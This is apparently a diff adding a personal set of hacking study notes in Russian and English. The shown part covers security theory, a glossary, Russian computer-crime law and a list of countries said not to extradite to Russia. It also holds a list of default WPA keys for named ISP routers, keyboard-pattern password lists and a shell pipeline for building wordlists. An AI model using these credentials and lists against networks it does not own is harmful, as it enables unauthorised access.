@@ -1,0 +1,3303 @@
+
+# Table of Contents
+
+1.  [learning materials](#orgb8bbf1a)
+    1.  [youtube channels](#org987764b)
+2.  [exfiltration](#org79c85ed)
+3.  [theory](#org74bae6d)
+    1.  [Security Theory](#org03baa31)
+    2.  [Computer access control](#orge3158ab)
+4.  [criptography](#org12f08d7)
+5.  [terms](#org70a884f)
+    1.  [security terms](#org1a432a9)
+6.  [law](#orga6af13c)
+    1.  [cyber attacker/attack attribution](#org6fc7b41)
+        1.  [techs](#orgd7f2cf8)
+    2.  [rus](#org8e065c4)
+        1.  [Неправомерный доступ к компьютерной информации ( ст. 272 УК)](#org17531bb)
+        2.  [Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст. 274 УК)](#org0665467)
+        3.  [Список стран, не выдающих преступников РФ](#org85edc0c)
+7.  [Organizations https://owasp.org/](#org30285c7)
+8.  [password](#org11c8bbd)
+    1.  [most common](#orgf715840)
+    2.  [Default passwords wifi WPA2](#orgfda1e8a)
+    3.  [key sequence](#org6e4fc89)
+    4.  [dates](#org5433d94)
+    5.  [patterns or modifiers](#org7b94bd8)
+    6.  [additional charactes](#org8b8e3b3)
+    7.  [simple obfuscation or Replacement Password Pattern](#org598b5ac)
+    8.  [words](#org6ce5cb9)
+        1.  [rus:](#org9531ff3)
+        2.  [rus names](#orgbaa6cec)
+        3.  [universal:](#org13fb68d)
+        4.  [games:](#org52725c6)
+        5.  [companies](#org036e37b)
+        6.  [eng:](#org44f9938)
+    9.  [stats](#orgdbb9538)
+    10. [generate wordlist](#orgc46644e)
+        1.  [John the Ripper](#orgd09ce2e)
+        2.  [app-crypt/johntheripper-jumbo](#org6cad89f)
+        3.  [hashcat](#org5c08348)
+        4.  [app-misc/crunch](#org3ef8f65)
+    11. [my sequence](#org86cf025)
+    12. [bash for passwords](#orgaba10a4)
+    13. [bash generate password](#orgc25e737)
+    14. [my](#org83cb2bf)
+    15. [bases](#org58c1c05)
+    16. [fast permutation](#orgecd090f)
+    17. [brutefoce in c](#orgfcb7901)
+9.  [reverse engeering](#org7534fa8)
+    1.  [links](#org2439deb)
+    2.  [objdump](#org93e0834)
+    3.  [file](#orgaffebf6)
+    4.  [Dynamic analysis](#org6c0fa89)
+        1.  [gdb](#org5668e5f)
+    5.  [Assembler](#org2509831)
+    6.  [syntaxes](#org4e4ba36)
+10. [attacks theory](#org90a21d6)
+    1.  [base attacks](#org7032e1e)
+    2.  [server-side attacks](#orga8c7903)
+    3.  [client-side attacks](#org0e2839c)
+        1.  [injection attack](#orgdb805b1)
+    4.  [OWASP top 10](#org90df0a6)
+        1.  [Broken Authentication and Session Management](#org899aabe)
+        2.  [Sensitive Data Exposure](#org521181b)
+        3.  [XML External Entities (XXE).](#orgdefcdf9)
+        4.  [Broken Access Control.](#org35e75fc)
+        5.  [Security Misconfiguration](#org09653d6)
+        6.  [Insecure Deserialization](#org6000388)
+        7.  [Using Components with Known Vulnerabilities](#org62e093e)
+        8.  [Insufficient Logging & Monitoring](#org86294eb)
+    5.  [links](#orga32db88)
+11. [virus](#org9ef7c3f)
+12. [virus spreading](#orgb43d6d3)
+13. [NN code scaner](#orgde9c6a3)
+14. [penetration / infiltrate system](#orgc795fdb)
+    1.  [penetration testing tool](#org0ead04c)
+        1.  [Zed Attack Proxy (ZAP) OWASP project](#org2fad0a4)
+        2.  [links](#org7a2fdde)
+    2.  [linux .desktop file](#orgdbc6e68)
+    3.  [webtesting suite](#org549e652)
+15. [exfiltrate data](#org262a33a)
+16. [Command and Control Center](#orgc3ad2f0)
+17. [zombie control ](#org75ef6d5)
+18. [](#org7110c10)
+19. [Linux investigate](#orga8a8f3b)
+    1.  [all](#org66f89f0)
+20. [Linux hide](#orgf23a82d)
+    1.  [bash history](#org20019c6)
+21. [scanning network](#org2eae2e1)
+22. [Phishing](#org916e3bc)
+23. [Exploit](#org963a15b)
+24. [nmap](#org398f4e2)
+    1.  [theory](#orgf0f068a)
+        1.  [ports](#org1cc83bc)
+        2.  [addressing](#org0f8895e)
+        3.  [port states](#org4f437a2)
+    2.  [default scan](#orgb6b46d3)
+    3.  [SCAN TECHNIQUES](#org231a847)
+    4.  [nping  Network packet generation tool](#orgca8d838)
+    5.  [ncat - reading, writing, redirecting, and encrypting data across a network](#org68cb035)
+    6.  [USECASES](#orga17c85b)
+        1.  [system and version scan](#org6b91839)
+        2.  [port scan:](#org1d0e1c6)
+        3.  [scan subnet](#org9dedaea)
+25. [wifi](#org48afb0b)
+    1.  [net-wireless/kismet](#org6194046)
+        1.  [links](#org5445acc)
+    2.  [to watch communication](#orgb03f8fe)
+    3.  [attacks](#orgd4c253c)
+        1.  [attacks](#orge27e9cc)
+        2.  [KRACK (Key Reinstallation Attack)](#orgd3cf15a)
+        3.  [WPA2 brute force](#org3948c8c)
+        4.  [WPS online brute force](#orgaa1f955)
+    4.  [tcpdump](#org628d0a3)
+    5.  [hashcat](#org36d040d)
+    6.  [hcxdumptool](#org494814c)
+    7.  [HashCat](#orgdfa899a)
+    8.  [john the reaper](#org336682c)
+        1.  [rules](#orge3a63ac)
+    9.  [JtR](#org91f5538)
+    10. [https://beta.ivc.no/wiki/index.php/WPA\_Attack](#org8ff11e0)
+    11. [https://kalitut.com/hacking-wifi-using-pmkid-and-aircrack-ng/](#orgd1462ef)
+    12. [android https://github.com/VREMSoftwareDevelopment/WiFiAnalyzer](#orga61a98f)
+    13. [my](#org7d235a1)
+26. [pixiewps - WPS offline brute force](#org52c26a1)
+    1.  [reset router](#org63121bc)
+    2.  [links](#org23e0f9e)
+    3.  [bully online WPS](#org5f33c50)
+27. [net-wireless/aircrack-ng](#org0c83920)
+    1.  [suite components](#org43f1899)
+    2.  [airbase](#org74d16be)
+        1.  [features](#orge6e5542)
+    3.  [airmon](#org2bf9bca)
+    4.  [airodump](#orgd407255)
+        1.  [default:](#org5a3a66c)
+        2.  [output](#org49e13bd)
+    5.  [aireplay-ng](#org7b5f6c9)
+    6.  [airgraph-ng](#org0733572)
+    7.  [links](#orgabda8c8)
+28. [mdk5](#orgd58876b)
+29. [wireshark](#orgae7567f)
+    1.  [filters wifi](#org03e7927)
+    2.  [install](#orgd5d03cb)
+    3.  [tools](#org4707d68)
+    4.  [flags](#org5ffe160)
+    5.  [decrypt WPA2 frames](#orge684a85)
+    6.  [extract PMKID](#org3d62516)
+30. [python scapy - forge or decode packets](#org12cdc55)
+31. [police ride](#org5df0994)
+    1.  [1](#orgb590ffa)
+    2.  [2](#org8bf50ab)
+    3.  [3](#org34aefdb)
+32. [info gathering](#org8e24786)
+33. [sudo linux password stealing](#org3ae4332)
+34. [distros](#orga63b4f8)
+    1.  [kali](#org387e33a)
+    2.  [pentoo](#org425d55a)
+    3.  [Tails](#org25bdc05)
+35. [virtualization](#org18f98ce)
+36. [culture](#org6e29d76)
+    1.  [classification of hackers](#org63abd76)
+
+-**- mode: Org; fill-column: 120; -**-
+
+TODO <https://www.youtube.com/watch?v=RGilepZEApY&list=PLfKe4duE4yJcv63tTh5q29Xc19fkG3GI7>
+
+-   rus articles <https://www.securitylab.ru/>
+-   web server vulnerables and penetration tester <https://portswigger.net/kb/issues>
+-   <https://github.com/ksanchezcld/Hacking_Cheat_Sheet>
+-   hacker <https://github.com/axcheron>
+
+    20 Best WiFi Hacking Tools for PC (2022) - TechCult
+
+techcult.com/best-wifi-hacking-tools-for-pc/
+
+20 Best Wifi Hacking Tools for PC (2020) 1. Aircrack-ng 2. WireShark 3. Cain &
+Abel 4. Nmap 5. Metasploit 6. Kismet 7. NetSparker 8. Airsnort 9. Ettercap 10. NetStumbler 11. Kiuwan 12. Nikto 13. Burp
+Suite 14. John the Ripper 15. Medusa 16. Angry IP Scanner 17. OpenVas 18. SQL Map 19. Intruder 20. Maltego 20
+Best Wifi Hacking Tools for PC (2020) 1.
+
+
+<a id="orgb8bbf1a"></a>
+
+# learning materials
+
+-   arsenal <https://w4rri0r.com/hacking-tools-windows-os-x-linux-android-solaris-unixware/vulnerability-assessment.html>
+
+TODO <https://www.tutorialspoint.com/wireless_security/>
+
+-   lessons <https://www.hacker101.com/>
+-   training www.hackthebox.com
+-   <https://portswigger.net/web-security/learning-path>
+
+
+<a id="org987764b"></a>
+
+## youtube channels
+
+Null Byte :- heres <https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g>
+SecurityFWD :- here <https://www.youtube.com/c/SecurityFWD/videos>
+LiveOverflow :- here <https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos>
+Seytonic :- here <https://www.youtube.com/c/Seytonic/videos>
+HackerSploit :- here <https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q>
+Hak5 :- here <https://www.youtube.com/channel/UC3s0BtrBJpwNDaflRSoiieQ>
+Unkn0wnUser :- here <https://www.youtube.com/c/Unkn0wnUser/videos>
+PwnFunction :- here <https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A>
+Loi Liang Yang :- here <https://www.youtube.com/channel/UC1szFCBUWXY3ESff8dJjjzw>
+OALabs :- here <https://www.youtube.com/c/OALabs/videos>
+
+
+<a id="org79c85ed"></a>
+
+# TODO exfiltration
+
+Data exfiltration / data exportation / data extrusion / data theft
+
+<https://xakep.ru/2022/09/22/infilltration-and-exfiltration/>
+как передать эти прог­раммы в ском­про­мети­рован­ную сеть <https://github.com/s0i37/exfiltrate>
+
+-   пол­ном отсутс­твии тре­бова­ний к адми­нис­тра­тив­ным при­виле­гиям и при­цел на перено­симость — ведь на
+    иссле­дуемом сер­вере ока­жет­ся либо Windows, либо Linux
+
+
+<a id="org74bae6d"></a>
+
+# theory
+
+<https://www.cybok.org/knowledgebase1_1/>
+
+Human, Organisational & Regulatory aspects
+
+-   TODO
+
+
+<a id="org03baa31"></a>
+
+## Security Theory
+
+Attacks & Defences
+
+-   Malware & Attack Technologies - exploits, ditributed malicious systems
+-   Adversarial Behaviours - malware supply chains, attack vectors, mokney transfers
+-   Security Operations & Incident Management - securre systems, threat intelligence
+-   Forensics - collection analysis and reporting of digital evidence
+
+System security
+
+-   Operating Systems & Virtualisation sec - sharing of resources, multiuser, database
+-   Cryptography - protocols that use them
+-   Formal Methods for Security -
+-   Hardware Security - Infrastructure security
+-   Network sec - Infrastructure security
+-   Authentication, Authorisation & Accountability -
+-   Distributed Systems sec - secure consensus, time, event systems, peer-to-peer, cloud, multitenant data center
+-   Web & Mobile sec - Software & Plstform security
+
+Infrastructure security
+
+-   Applied Cryptography - application, issues around implementation,key management, use within protocols and systems
+-   Cyber Physical systems - internet of things & industrial control systems, attacker models, large-scale infrastructures
+-   Physical Layer and Telecommunications sec - concertns ans limitations of the physical layer, radio frequency encoding, unintended radiation, interference
+
+Software & Plstform security
+
+-   software sec - programming errors, sec bugs
+-   Secure software lifecycle -
+
+
+<a id="orge3158ab"></a>
+
+## Computer access control
+
+includes
+
+-   identification - prove person identity
+-   authorization -  approve request by access prolicy
+-   authentication - verifying that identity
+-   access approval - requests in session
+-   audit trail - audit log
+
+
+<a id="org12f08d7"></a>
+
+# criptography
+
+One-time pad -  encryption technique that cannot be cracked
+
+Diffie–Hellman key exchange - one of the first public-key protocols
+
+Symmetric encryption - reverse substitution and transpositions transformations without knowing the key
+
+Asymmetric encryption - depend on mathematical problems that are thought to be difficult to solve
+
+**Semantic security** - ciphertext indistinguishability - hard to guess element of message space.  the adversary should
+learn no information from seeing a ciphertext
+
+-   semantically insecure algorithms: RSA
+-   random encryption padding schemes can increase Semantic security, ex  Optimal Asymmetric Encryption Padding (OAEP)
+
+attacks
+
+-   Known-plaintext attack (KPA) - attacker has access to both the plaintext (called a crib), and its encrypted version (ciphertext)
+-   Chosen-plaintext attack (CPA) - attacker can obtain the ciphertexts for arbitrary plaintexts
+-   Chosen-ciphertext attack (CCA) - with obtained decryptions of chosen ciphertexts.
+-   Adaptive chosen-ciphertext attack (CCA2) - attacker first sends a number of ciphertexts to be decrypted chosen
+    adaptively, then uses the results to distinguish a target ciphertext without consulting the oracle on the challenge
+    ciphertext - интерактивная форма атаки с выбранным зашифрованным текстом, в которой злоумышленник сначала отправляет
+    несколько зашифрованных текстов для дешифрования, выбранных адаптивно, затем использует результаты для распознавания
+    целевого зашифрованного текста, не консультируясь с oracle по зашифрованному тексту вызова
+
+**Oracle machine** - can be visualized as a Turing machine with a black box, called an oracle, which is able to solve
+certain problems in a single operation
+
+**PKCS** - for "Public Key Cryptography Standards"  published by RSA Security LLC
+
+public key infrastructure (PKI) - is a set of roles, policies, hardware, software and procedures. The X.509 standard
+defines the most commonly used format for public key certificates.
+
+-   certificate authority (CA) - stores, issues and signs the digital certificates
+-   registration authority (RA) - verifies the identity of entities requesting their digital certificates to be stored at
+    the CA
+-
+
+Public key certificate - electronic document used to prove the validity of a public key
+
+-   include: digital signature of the issuer that has verified the certificate's contents
+
+Key derivation function - cryptographic algorithm that derives one or more secret keys from a secret value using a
+pseudorandom function.
+
+-   Ex. result of a Diffie–Hellman key exchange into a symmetric key for use with AES
+-   Ex. password hashing
+
+
+<a id="org70a884f"></a>
+
+# terms
+
+-   mitigation strategy [mɪtɪˈgeɪʃn - стратегия смягчения последствий
+-   spoofing [spuːf] - имитация
+-   surveillance [sɜːˈveɪləns] - наблюдение
+-   Countersurveillance - противодействие наблюдению
+-   sousveillance [suː] - inverse surveillance. French words sur, meaning "above", and
+    sous, meaning "below" - камера на голове - не направлено против surveillance
+-   Concealing [kənˈsiːlɪŋ] - сокрытие, скрывающий
+-   ransomware ransom — выкуп и software — программное обеспечение - вымогатель
+-   honeypot - система обнаружения нападения маскирующаяся под обычный сервер
+-   kill switch - emergency off button
+-   remote access trojan (RAT, sometimes called creepware)
+-   Adversarial [ædvəsəˈrɪəl] - враждебный
+-   Adversary [ˈædvəsərɪ] - неприятель
+-   malicious [məˈlɪʃəs] - злонамеренный
+-   nefarious [ni-ˈfer-ē-əs] - гнусный
+-   perpetrators [ˈpɜːpɪtreɪtə] - виновники преступлений
+-   extraneous [ɪkˈstreɪnɪəs] - чужеродный, посторонний, лишний
+-   susceptible [səˈseptəbl] - восприимчивый
+-   multitenant data center - многофункциональный центр обработки данных
+-   distributed ledgers - распределенные бухгалтерские книги
+-   liability [laɪəˈbɪlɪtɪ] - ответственность
+-   assess [əˈses] - оценивать
+-   disguise [dɪsˈgaɪz] - маскировать
+-   coercion and deterrence [kəʊˈɜːʃn] [dɪˈterəns] - принуждение и сдерживание
+-   negligible [ˈneglɪʤəbl] - пренебрежимо малый
+-   feasibly [ˈfiːzəblɪ] - осуществимо
+-   snooping [ˈsnuːpɪŋ] - слежка, прослушивание
+-   plausible deniability [ˈplɔːzəbl] (dɪˌnaɪəˈbɪlɪtɪ) - правдоподобное отрицание (deniable - спорный) - отрицание факта
+    наличия щифрования или расшифровывания только отвлекающих данных
+-   obscures [əbˈskjʊə] - obscures malicious traffic within normal traffic
+-   Cryptographic primitive - low-level cryptographic algorithms
+    -   One-way hash function
+    -   Symmetric key cryptography - cryptographic keys for both the encryption the decryption (ex. AES)
+    -   Public-key cryptography (ex. RSA)
+    -   Digital signatures
+    -   Mix network
+    -   Private information retrieval - get database information without server knowing which item was requested
+    -   Commitment scheme - allows one to commit to a chosen value while keeping it hidden to others, with the ability to reveal it later
+-   Salt - random data that is used as an additional input to a one-way function that hashes data, a password or
+    passphrase/ Salts defend against attacks that use precomputed tables (e.g. rainbow tables)
+-   Cryptographic nonce - is an arbitrary number that can be used just once in a cryptographic communication - a random or
+    pseudo-random number issued in an authentication protocol to ensure that old communications cannot be reused in replay
+    attacks.
+-   Rainbow table - precomputed table for caching the output of cryptographic hash functions
+-   reverse shell - shell session established on a connection that is initiated from a remote machine, not from the local
+    host
+-   Data exfiltration - malicious actor carries out an unauthorized data transfer from a computer
+-   infiltration  [ɪnfɪlˈtreɪʃn] - проникновение
+-   Command-and-control (C&C or C2) - malicious communication between a C&C server and malware
+-   red-team assessment [əˈsesmənt] - оценка, similar to a penetration test. blue team - defenders.
+
+
+<a id="org1a432a9"></a>
+
+## security terms
+
+-   **Information security** - practice of protecting information by mitigating information risks. It is
+    part of information risk management.
+-   **Security engineering** - process of incorporating security controls into an information system so
+    that the controls become an integral part of the system’s operational capabilities
+-   **Intrusion detection system** - device or software application that monitors a network or systems
+    for malicious activity or policy violations. collected centrally using a security information and
+    event management (SIEM) system
+    -   network intrusion detection systems (NIDS)
+    -   host-based intrusion detection systems (HIDS)
+-   **Countersurveillance**
+
+
+<a id="orga6af13c"></a>
+
+# law
+
+
+<a id="org6fc7b41"></a>
+
+## cyber attacker/attack attribution
+
+-   Attribution is the art of answering a question:  who did it?
+-   Sine qua non - latin условие, без которого
+-   The attribution of an attack to a state or state agents is a condicio sine qua non under
+    international law.
+
+-   tactical goal - technical aspects, **the how**
+    -   What was the intrusion mechanism?
+-   perational goal - the attack’s high-level architecture and the attacker’s profile — **the what**
+    -   What was the motive?
+-   strategic goal - assessing the attack’s rationale, significance, appropriate response — the who
+    and why.
+-   communication - communicating the outcome of a labour-intensive forensic investigation
+
+aperture: the scope of sources that can be brought to bear on a specific investigation
+
+
+<a id="orgd7f2cf8"></a>
+
+### techs
+
+1.  Store Logs & Traceback Queries
+2.  Perform Input Debugging
+3.  Modify Transmitted Messages
+4.  Transmit Separate Messages (e.g., iTrace)
+5.  Reconfigure & Observe Network
+6.  Query Hosts
+7.  Insert Host Monitor Functions
+8.  Match Streams (via headers, content, and/or timing)
+9.  Exploit/Force Attacker Self-Identification (e.g., beacons, web bugs, cookies, watermarking)
+10. Observe Honeypot/honeynet
+11. Employ Forward-deployed Intrusion Detection Systems (IDSs)
+12. Perform Filtering (e.g., Network Ingress Filtering)
+13. Implement Spoof Prevention
+14. Secure Hosts/Routers  (e.g., “Hack Back”)
+15. Surveil Attacker
+16. Employ Reverse Flow
+17. Combine Techniques
+
+<https://www.researchgate.net/publication/235170094_Techniques_for_Cyber_Attack_Attribution>
+
+
+<a id="org8e065c4"></a>
+
+## rus
+
+<http://www.ceae.ru/urids-komp-prestup.htm>
+
+Управление "К" МВД РФ и отделы "К" региональных управлений внутренних дел,входящие в состав Бюро
+специальных технических мероприятий МВД РФ.
+
+ общим объектом компьютерных преступлений будет совокупность всех общественных отношений, охраняемых
+уголовным законом, родовым - общественная безопасность и общ. порядок; видовым - совокупность
+общественных отношений по правомерному и безопасному использованию информации; непосредственный
+объект трактуется исходя из названий и диспозиций конкретных статей.
+
+Отсутствие посягательства на эти общественные отношения (либо незначительность такого
+посягательства) исключает уголовную ответственность в силу ч. 2 ст. 14 УК РФ
+
+гл. 28 УК, которое говорит не о посягательстве на объект, а о посягательствах в определенной "сфере".
+
+Преступлениями в сфере компьютерной информации являются:
+
+1.  Неправомерный доступ к компьютерной информации (ст.272 УК РФ);
+2.  Создание, использование и распространение вредоносных программ для ЭВМ (ст.273 УК РФ);
+3.  Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст.274 УК РФ);
+
+Физическое повреждение или уничтожение компьютерной техники, незаконное завладение ею, а равно
+машинными носителями (дискетами, CD-R дисками), как предметами, обладающими материальной ценностью,
+квалифицируются по статьям главы 21 УК РФ
+
+Между деянием и последствиями обязательно должна быть установлена причинная связь.
+
+Субъективная сторона компьютерных преступлений характеризуется умышленной виной.
+
+В ч. 2 ст. 24 сказано, что деяние совершенное по неосторожности признается преступлением только тогда, когда это специально предусмотрено соответствующей статьей Особенной части УК
+
+лицо, имеющее доступ к ЭВМ, системе ЭВМ или их сети.
+
+
+<a id="org17531bb"></a>
+
+### Неправомерный доступ к компьютерной информации ( ст. 272 УК)
+
+если это деяние повлекло уничтожение. Блокирование, модификацию, либо копирование информации,
+нарушение работы ЭВМ, системы ЭВМ или их сети.
+
+Эта информация должна быть чужой для осуществляющего неправомерный доступ
+
+Субъективная сторона преступления характеризуется виной в форме умысла: лицо сознает, что
+осуществляет неправомерный (несанкционированный) доступ к охраняемой законом компьютерной
+информации, предвидит, что в результате производимых им действий могут наступить или неизбежно
+наступят указанные в законе вредные последствия, и желает (прямой умысел) или сознательно допускает
+(косвенный умысел) их наступления либо относится к ним безразлично.
+
+
+<a id="org0665467"></a>
+
+### Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст. 274 УК)
+
+повлекшее уничтожение, блокирование или модификацию охраняемой законом информации, если это деяние
+причинило существенный вред.
+
+
+<a id="org85edc0c"></a>
+
+### Список стран, не выдающих преступников РФ
+
+-   Великобритания;
+-   Китай;
+-   Америка;
+-   Беларусь;
+-   Украина;
+-   Израиль;
+-   Польша;
+-   Швеция;
+-   Венесуэла;
+-   Япония - Из-за отсутствия двустороннего соглашения Япония не выдает преступников России.
+
+Камбодже, Тринидаде, Никарагуа, Тобаго
+
+\*
+
+
+<a id="org30285c7"></a>
+
+# Organizations <https://owasp.org/>
+
+-   OWASP - online community that produces freely-available articles, methodologies, documentation,
+    tools, and technologies in the field of web application security
+-   Security Industry Association - representing electronic and physical security solutions providers
+
+
+<a id="org11c8bbd"></a>
+
+# password
+
+
+<a id="orgf715840"></a>
+
+## most common
+
+1.  Default passwords
+2.  key sequence, reverse key sequences
+3.  personal information
+    -   name
+    -   birthday - 1/1/1970 1.1.1970, 1/1/70
+    -   phone number 89&#x2026;&#x2026;&#x2026; or +79&#x2026;&#x2026;&#x2026;
+    -   personal number
+    -   address
+    -   nicknames
+4.  space specific: site, company, chat
+5.  language specific words and universal worlds
+6.  double 3,4,5 words
+
+
+<a id="orgfda1e8a"></a>
+
+## Default passwords wifi WPA2
+
+password, default, admin, root, guest, year2000, manager, digit, private, D-Link, alpine, telco
+
+-   <https://www.routerpasswords.com/>
+-   <https://github.com/3mrgnc3/RouterKeySpaceWordlists>
+-   TP Link - 8 chars [0-9]
+-   qtech: 32625585
+-   hiawei: 07225C45827
+-   ZTE: eCavtVDe, d21????F
+-   keenetic: ncKxATQn
+    -   keenetic-3055:cMHsmdj3
+    -   keenetic-4345:9mftKELH
+    -   keenetic-0809:ouzPMWxL
+    -   Keenetic(ZyXEL): en5Klc55
+-   ZyXEL Kenetic Giga:pin:51029203
+-   netis:password
+-   Wifire-2.4: YFOP7PBM
+-   WiFi-DOM.ri:KCAmwrPiGH
+-   Ростелеком:BFW7P3PQ, RT<sub>WiFi</sub><sub>ADE8</sub>:v2VKfEyg, RT<sub>WiFi</sub><sub>0E65</sub>:Ce2ch5ex
+    -   RT<sub>Wifi</sub>:user:qtech,pass:qtech
+    -   RT-WIFI QTECH:123456789012
+    -   RT<sub>WiFi</sub>(ZTE CORP):gqYyAaeX
+    -   ROSTELECOM<sub>(Sagemcom)</sub>:MCR4F64F
+-   MTSRouter<sub>(SERCOMM)</sub>:RRgA9jTF
+    -   UniversalRouterMTS(Sagemcom):VG97ACNG,admin,mts
+    -   MTSRouter(D-Link):43621996, MTSRouter(D-Link DIR-615):37674724
+    -   MTSRouter<sub>2.4G</sub>(SERCOMM):8-chan up down alphanumeric
+    -   MTS<sub>Router</sub><sub>240985</sub>-77ed-D-Link<sub>International</sub>: 10048566
+    -   MTSRouter<sub>404E27</sub>(D-Link<sub>International</sub>):8 chars [0-9]
+-   MGTS<sub>GPON</sub>
+    -   SERCOMM
+        -   MGTS<sub>GPON</sub><sub>9921</sub>: H6RU5R6P - SERCOMM
+        -   MGTS<sub>GPON</sub><sub>7901</sub>: JMZQ88VZ - SERCOMM
+        -   9883: ZCMKTKSS
+        -   MGTS<sub>GPON</sub><sub>9949</sub> / MGTS<sub>GPON5</sub><sub>9949</sub> : MQK6MNTK
+    -   zte corporation
+        -   MGTS<sub>GPON</sub><sub>37E1</sub>: 23f3de64
+        -   MGTS<sub>GPON</sub><sub>3ED2</sub>: 8ab8b02f
+        -   MGTS<sub>GPON</sub><sub>F337</sub> / MGTS<sub>GPON5</sub><sub>F337</sub> : nbNjFWGb
+        -   MGTS<sub>GPON</sub><sub>4AFE</sub> / MGTS<sub>GPON5</sub><sub>4AFE</sub> : eft6n7jK
+-   GPON терминал - ZTE-bc865e: 981428bc
+-   Beeline(SmartBox turbo+):mnm2xq6x
+    -   Beeline(SmartBox one):WJmNgmX6AT
+-   MERCUSYS\_:25399653
+-   (Huawei home router)SUPERONLINE<sub>WiFi</sub>:94HTFJTAYMMY
+    -   VDF-HG532e:WEB:
+    -   WirelessNet(EchoLife):mgtswifi
+    -   HUAWEI-v7e9:485754438DF0639D
+    -   4G-Mobile-WiFi:e
+-   UR-325BN: D4BF7F05AF2D
+-   HGU0C830:624AC830
+-   D-Ling(DIR-620):pin:1234123412
+-   ASUS:pin:00343459,pin:38472585
+-   TRENDnet810<sub>2.4</sub>:81031005793,admin,BY6Q3AKD
+-   ZTE:2sat943s
+-   ubiquiti networks: ubnt/ubnt, no default WPA pass - must be set up
+-   AndroidAP: yjru7079
+
+
+<a id="org6e4fc89"></a>
+
+## key sequence
+
+-   password, adminadmin, AdminAdmin, passWord, PassWord
+-   123, 1234, 12345, 123456, 1234567, 12345678, 123456789
+-   qwe, qwer, qwert, qwerty, qwertyu, qwertyui, qwertyuio, qwertyuiop
+-   asd, asdf, asdfg, asdfgh, asdfghj, asdfghjk, asdfghjkl
+-   zxc, zxcv, zxcvb, zxcvbn, zxcvbnm, zxcvbnm,
+-   qazqaz, qazqazqaz, wsxwsx, wsxwsxwsx, edcedc, edcedcedc
+-   1qaz, 1qaz2wsx, 1qaz2wsx3edc
+-   qazwsx, qazwsx123, 123qazwsx, qazwsxedc, qazwsxedcrfv
+-   qazxsw, 123qazxsw, qazxswedc
+-   abcd, abcde, abcdef, abcdefg, abcdefgh
+-   1q2w3e4r5t6y, 1q2w3e4r5t6, 1q2w3e4r5t, 1q2w3e4r5, 1q2w3e4r, 1q2w3e4, 1q2w3e, 1q2w3, 1q2w
+-   q1w2e3r4t5y6, q1w2e3r4t5y, q1w2e3r4t5, q1w2e3r4t, q1w2e3r4, q1w2e3r, q1w2e3, q1w2e, q1w2
+-   REP8 4-10: alphabet+spec = aaaaaaaa, bbbbbbbb, 11111111
+-   PERM2 2-4: 1 2 3 4 5 6 7 8 9 - = = 12121212, 32323232, -`-`-`-`
+-   PROD 2-3: 123 qwe asd zxc 321 ewq dsa cxz = 123123, 123qwe, qwe123
+-   PROD 2: 1234 qwer asdf zxcv 4321 rewq fdsa vcxz = 12341234, 1234qwer,
+-   RARE! REP2: 12345, qwert, asdf, zxcvb, 54321, trewq, fdsa, bvcxz
+-   PROD2,3: qaz wsx, edc, zaq xsw, cde, 123, 321
+-   PROD2: 1qaz, 2wsx, 3edc, zaq1, xsw2, cde3
+-   PROD4: 12, 21, qw, as, zx, wq, sa, xz
+-   PROD4: 12, 21, po, op, lk, kl, mn, nm
+-   PAIRS2-4 from: qwertyuiop[], asdfghjkl;', zxcvbnm, (and reverse): qwqwqwqw, wewewewe
+-   adadadad, asasasas, asas, qeqeqeqe, qeqe, zczc, zczczczc, qeqe, qeqeqeqe
+-   1234567a, 123456aa, 1234aaaa, 123aaaa
+-   a1234567, aa123456, aaa12345, aaaa1234
+-   11223344, 1122334455, 111222333, 11112222
+-   1234abcd, 12345abcd, 12345abc, 123456abcd, 12345abc, 123456abc
+-   123456789a, 1234567a, 1234567b, 12345678b, 1234567c
+-   a123456789, a1234567, b1234567, b12345678, c1234567
+-   789456123, 890567234, 321654987
+-   qwerty123, qwert123, 123qwerty, qwert123, 12345qwe, 12345qwer, 123456qw
+-   1234567890, 123456789, 12345678, 0123456789, 012345678
+-   12344321, 123454321, 1234554321
+-   1qazxsw2
+-   102030405, 102030405, 1020304050, 102030406, 01020304, 0102030405
+-   147258369, 741852963, 963852741
+-   qwaszx, 123qwaszx, qwaszx123, zxasqw, zxasqw123, 123zxasqw
+-   1234567891
+-   1qazxsw2
+-   1029384756, 0192837465, 1092387456, 0129834765
+-   zaq12wsx
+-   0987654321, 098765432, 09876543, 0987654, 098765, 09876, 0987, 098
+-   !@#$%^&\*()\_+, !@#$%^&\*()\_, !@#$%^&\*(), !@#$%^&\*(, !@#$%^&\*
+
+transfer:
+
+1.  copy this to file key<sub>sequences</sub>
+
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' > key_sequences_cap
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' | tr [:lower:] [:upper:] >> key_sequences_cap
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' | tr [:upper:] [:lower:] >> key_sequences_cap
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' | rev >> key_sequences_cap
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' | rev | tr [:lower:] [:upper:] >> key_sequences_cap
+    cut -d " " -f2- key_sequences | grep -v -e REP -e PROD -e PERM | sed 's/, /\n/g' | rev | tr [:upper:] [:lower:] >> key_sequences_cap
+    cat key_sequences_cap | uniq |sed -nr '/^.{8,12}$/p' > key_sequences_cap8-12u
+
+
+<a id="org5433d94"></a>
+
+## dates
+
+-   year, month, date - date, month, year
+    -   simple
+    -   0
+    -   with/without 0 with special characters as separators .,\_,-,/,#
+    -   without 20 and 19 in year
+
+
+<a id="org7b94bd8"></a>
+
+## patterns or modifiers
+
+-   divide letters to 1,2,3,4 parts - first, one of, or every second is capital
+    -   The first letter is a capital letter.
+-   additional characters
+-   simple obfuscation or Replacement Password Pattern
+
+
+<a id="org8b8e3b3"></a>
+
+## additional charactes
+
+-   simple - 1, 11, 12, 13, 123, a, q, qq, aa, 0, 00, 01, 2, 3, 7, ., \_, !, -, @, \*, #, /, $
+-   double and triple of 1 character simple
+-   any digital double - 11, 22, 33
